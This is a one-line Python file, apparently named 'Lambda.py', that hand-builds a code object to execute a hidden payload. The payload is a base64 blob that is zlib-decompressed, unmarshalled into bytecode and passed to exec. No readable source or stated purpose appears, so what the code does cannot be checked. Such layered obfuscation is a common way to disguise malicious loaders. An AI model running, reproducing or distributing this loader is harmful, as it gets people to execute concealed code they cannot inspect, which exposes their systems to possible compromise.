_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z\x16e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00d\x04S\x00\x04\x00e\x05y/\x01\x00Z\x06\x01\x00z\re\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x00Y\x00d\x04Z\x06[\x06d\x04S\x00d\x04Z\x06[\x06w\x01w\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'Lambda.py','<module>',1,b'.\x01',(),());_()
